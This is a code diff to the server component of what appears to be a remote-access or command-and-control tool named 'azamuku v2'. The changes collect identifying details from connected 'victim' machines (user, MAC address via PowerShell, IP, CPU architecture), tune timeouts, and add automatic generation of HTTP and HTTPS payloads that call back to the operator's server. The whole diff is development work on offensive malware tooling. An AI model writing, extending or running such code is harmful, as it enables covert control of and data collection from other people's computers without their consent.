@@ -40,9 +40,18 @@ def getInfo():
 
 
             if args.strict == False:
+                mac_cmd = (
+                    "$m = (Get-NetAdapter | Where-Object { $_.Status -eq 'Up' -and $_.MacAddress -ne '' -and "
+                    "$_.InterfaceDescription -notmatch 'Virtual|Loopback|Tunnel|WAN Miniport|Bluetooth|Hyper-V' } | "
+                    "Sort-Object -Property Speed -Descending | Select-Object -First 1).MacAddress; "
+                    "if ($m) { $m.Replace('-',':') } else { "
+                    "$m2 = (Get-NetAdapter | Where-Object { $_.Status -eq 'Up' -and $_.MacAddress -ne '' } | "
+                    "Select-Object -First 1).MacAddress; "
+                    "if ($m2) { $m2.Replace('-',':') } else { 'unknown' } }"
+                )
                 s.vicInfo[newUID] = {
                     "hostname": control.run("whoami"),
-                    "mac": control.run("Get-NetAdapter | Where-Object { $_.InterfaceAlias -eq (Get-NetRoute | Where-Object { $_.DestinationPrefix -eq '0.0.0.0/0' -and $_.NextHop -ne '0.0.0.0' }).InterfaceAlias } | Select-Object -ExpandProperty MacAddress").replace("-", ":"),
+                    "mac": control.run(mac_cmd).strip(),
                     "ip": s.client_ips.get(newUID, "unknown"),
                     "arch": "x86" if control.run("(Get-WmiObject -Class Win32_Processor).Architecture") == "0" else "x64",
                 }
@@ -70,7 +79,7 @@ def getInfo():
                 print(f"\n\n[!] New victim connected: {newUID} ({hostname} @ {ip_addr})\n")
                 print("[" + coolFade("azamuku v2", (125,0,0), (125,0,0)).strip() +"]> ", end="", flush=True)
             except:
-                print(f"\n\n[!] New victim connected: {newUID}\n")
+                print(f"\n\n[!] New victim connected: {newUID} ({hostname})\n")
                 print("[" + coolFade("azamuku v2", (125,0,0), (125,0,0)).strip() +"]> ", end="", flush=True)
 
             if newest == False:
@@ -87,7 +96,7 @@ def monitorConnections():
     Checks if clients have been inactive for more than the timeout period
     """
     global args
-    timeout = 30  # seconds of inactivity before considering a client disconnected
+    timeout = 15  # seconds of inactivity before considering a client disconnected
     
     while True:
         current_time = time.time()
@@ -219,8 +228,8 @@ if __name__ == '__main__':
                         default="0.0.0.0")
     
     parser.add_argument("--http-port",
-                        help="port to bind the http server to (default: 8080)",
-                        default="8080")
+                        help="port to bind the http server to (default: 8080, or 0 if --https-port is set)",
+                        default=None)
     
     parser.add_argument("--https-port",
                         help="port to bind the https server to (default: 0 (off))",
@@ -254,6 +263,13 @@ if __name__ == '__main__':
                         default=False)
 
     args = parser.parse_args()
+
+    # If --http-port wasn't explicitly set:
+    #   - if --https-port is active, default HTTP to off (0)
+    #   - otherwise default to 8080
+    if args.http_port is None:
+        args.http_port = "0" if int(args.https_port) != 0 else "8080"
+
     stager = args.stager
     srv = s.azamuku()
     
@@ -520,6 +536,21 @@ if __name__ == '__main__':
 
                     #     payload = s.payload.generatePayload(ip, "443", hotplug_payload)
                     #     print(highlight(payload, [ip], color=(150, 0, 0)))
+                elif cArgs == None:
+                    # No tunnel, no args - auto-use server IP and port(s) from startup args
+                    ip = args.server if args.server != "0.0.0.0" else "127.0.0.1"
+
+                    if int(args.http_port) != 0:
+                        port = args.http_port
+                        payload = s.payload.generatePayload(ip, port, "http.txt")
+                        print("[+] HTTP payload ({}:{}):\n".format(ip, port))
+                        print(highlight(payload, [ip, port], color=(150, 0, 0)))
+
+                    if int(args.https_port) != 0:
+                        port = args.https_port
+                        payload = s.payload.generatePayload(ip, port, "https.txt")
+                        print("[+] HTTPS payload ({}:{}):\n".format(ip, port))
+                        print(highlight(payload, [ip, port], color=(150, 0, 0)))
                 else:
                     # No tunnel, require IP and port arguments
                     if cArgs == None:
